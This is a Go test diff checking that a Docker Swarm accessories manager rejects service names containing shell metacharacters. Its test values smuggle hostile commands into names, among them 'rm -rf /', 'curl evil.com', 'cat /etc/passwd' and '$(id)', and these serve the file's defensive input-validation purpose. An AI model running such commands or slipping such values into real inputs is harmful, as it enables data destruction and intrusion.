@@ -95,6 +95,62 @@ func TestAccessoriesNewManager(t *testing.T) {
 	}
 }
 
+func TestManager_Start_InvalidName(t *testing.T) {
+	mockExec := NewAccessoriesMockExecutor()
+	manager := NewManager(mockExec, "test-stack", config.ModeSwarm)
+
+	err := manager.Start("redis; rm -rf /")
+	if err == nil {
+		t.Error("Start() should reject invalid name with shell metacharacters")
+	}
+
+	if !containsString(err.Error(), "must contain only alphanumeric characters") {
+		t.Errorf("Expected validation error, got: %v", err)
+	}
+}
+
+func TestManager_Stop_InvalidName(t *testing.T) {
+	mockExec := NewAccessoriesMockExecutor()
+	manager := NewManager(mockExec, "test-stack", config.ModeSwarm)
+
+	err := manager.Stop("postgres && curl evil.com")
+	if err == nil {
+		t.Error("Stop() should reject invalid name with shell metacharacters")
+	}
+
+	if !containsString(err.Error(), "must contain only alphanumeric characters") {
+		t.Errorf("Expected validation error, got: %v", err)
+	}
+}
+
+func TestManager_Restart_InvalidName(t *testing.T) {
+	mockExec := NewAccessoriesMockExecutor()
+	manager := NewManager(mockExec, "test-stack", config.ModeSwarm)
+
+	err := manager.Restart("redis`id`")
+	if err == nil {
+		t.Error("Restart() should reject invalid name with backticks")
+	}
+
+	if !containsString(err.Error(), "must contain only alphanumeric characters") {
+		t.Errorf("Expected validation error, got: %v", err)
+	}
+}
+
+func TestManager_GetStatus_InvalidName(t *testing.T) {
+	mockExec := NewAccessoriesMockExecutor()
+	manager := NewManager(mockExec, "test-stack", config.ModeSwarm)
+
+	_, err := manager.GetStatus("redis; cat /etc/passwd")
+	if err == nil {
+		t.Error("GetStatus() should reject invalid name with shell injection")
+	}
+
+	if !containsString(err.Error(), "must contain only alphanumeric characters") {
+		t.Errorf("Expected validation error, got: %v", err)
+	}
+}
+
 func TestAccessoriesNewManager_ComposeMode(t *testing.T) {
 	mockExec := NewAccessoriesMockExecutor()
 	manager := NewManager(mockExec, "test-stack", config.ModeCompose)
@@ -571,6 +627,64 @@ func TestManager_ListAll_GetStatusError(t *testing.T) {
 	} else if redisStatus.Replicas != "not deployed" || redisStatus.Running {
 		t.Errorf("Expected redis to be marked as not deployed, got replicas=%q, running=%v",
 			redisStatus.Replicas, redisStatus.Running)
+	}
+}
+
+func TestManager_CommandEscaping(t *testing.T) {
+	mockExec := NewAccessoriesMockExecutor()
+	manager := NewManager(mockExec, "test-stack", config.ModeSwarm)
+
+	evilName := "redis; rm -rf /tmp"
+	cmd := "docker service scale test-stack_redis; rm -rf /tmp=1"
+	mockExec.SetRunResult(cmd, &executor.CommandResult{ExitCode: 0})
+
+	err := manager.Start(evilName)
+	if err == nil {
+		t.Error("Start() should reject invalid name")
+	}
+
+	validName := "cache_redis"
+	mockExec.SetRunResult("docker service scale test-stack_cache_redis=1", &executor.CommandResult{ExitCode: 0})
+
+	err = manager.Start(validName)
+	if err != nil {
+		t.Errorf("Start() should accept valid name with underscores, got error: %v", err)
+	}
+}
+
+func TestManager_ValidationEdgeCases(t *testing.T) {
+	mockExec := NewAccessoriesMockExecutor()
+	manager := NewManager(mockExec, "test-stack", config.ModeSwarm)
+
+	testCases := []struct {
+		name          string
+		shouldBeValid bool
+	}{
+		{"redis", true},
+		{"redis_01", true},
+		{"cache_redis", true},
+		{"redis123", true},
+		{"r", true},
+		{"", false},
+		{"-invalid", false},
+		{"cache.redis", false},
+		{"cache-redis", false},
+		{"a" + strings.Repeat("b", 100), false},
+		{"redis;", false},
+		{"redis &&", false},
+		{"redis|", false},
+		{"redis`", false},
+		{"redis$(id)", false},
+	}
+
+	for _, tc := range testCases {
+		err := manager.Start(tc.name)
+		if tc.shouldBeValid && err != nil {
+			t.Errorf("Expected name '%s' to be valid, got error: %v", tc.name, err)
+		}
+		if !tc.shouldBeValid && err == nil {
+			t.Errorf("Expected name '%s' to be invalid", tc.name)
+		}
 	}
 }
 
